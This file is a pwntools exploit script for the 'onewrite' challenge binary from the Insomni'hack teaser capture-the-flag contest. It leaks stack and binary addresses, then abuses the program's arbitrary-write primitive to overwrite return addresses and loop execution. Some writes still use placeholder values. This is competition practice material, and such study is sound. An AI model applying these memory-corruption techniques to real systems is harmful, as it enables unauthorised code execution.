#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('onewrite')

host = args.HOST or 'onewrite.teaser.insomnihack.ch'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
break *0x7ffff7d52a7f
break *0x7ffff7d52a14
break *0x7ffff7d94587
continue
'''.format(**locals())

# -- Exploit goes here --

stack_off = -8
binary_off = -0x8A15
some_read = 0x4a587
frame = -0x28

context.terminal = ['gnome-terminal', '-e']


def leak_stack(io):
    io.sendlineafter('>', '1')
    stack = int(io.recvline().strip()[2:], 16)
    log.info(hex(stack))

    return stack

def leak_binary(io):
    io.sendlineafter('>', '2')
    base = int(io.recvline().strip()[2:], 16) + binary_off
    log.info(hex(base))
    #stack = int(io.recvline().strip()[2:], 16)
    #log.info(hex(stack))

    return base

def onewrite(io, addr, value):
    io.sendafter('address : ', str(addr))
    io.sendafter('data : ', value)

def chain_write(io, addr, value):
    # frame 0
    stack = leak_stack(io)
    onewrite(io, stack + stack_off, p64(exe.symbols['main']))

    # frame 1
    exe.address = leak_binary(io)
    onewrite(io, stack - 48, p64(exe.symbols['do_overwrite']))
    onewrite(io, stack - 0x18, p64(exe.symbols['do_overwrite']))
    leak_binary(io)
    log.info("AAAAAAAAA")
    onewrite(io, addr, value)
    #onewrite(io, stack - 0x1000, p64(0))

    #log.info(hex(stack + stack_off + frame))
    onewrite(io, stack + 8, p64(exe.symbols['main']))
    io.recv()


def static_expl():
    io = start()

    # frame 0
    stack = leak_stack(io)
    onewrite(io, stack +  stack_off, p16(0x2ab8))

    # frame 1
    exe.address = leak_binary(io)
    onewrite(io, stack - 48, p64(exe.symbols['do_overwrite']))
    onewrite(io, stack - 0x18, p64(exe.symbols['do_overwrite']))
    leak_binary(io)
    onewrite(io, stack - 0x100, p64(0))
    onewrite(io, stack + 8, p64(exe.symbols['main']))

    chain_write(io, 0xdeadbeef, p64(0xcafebabe))
    chain_write(io, 0xdeadbeef, p64(0xcafebabe))

    io.interactive()

if args.LOCAL:
    static_expl()
else:
    i = 0
    while True and i <= 20:
        try:
            static_expl()
            break
        except:
            pass

        i+=1

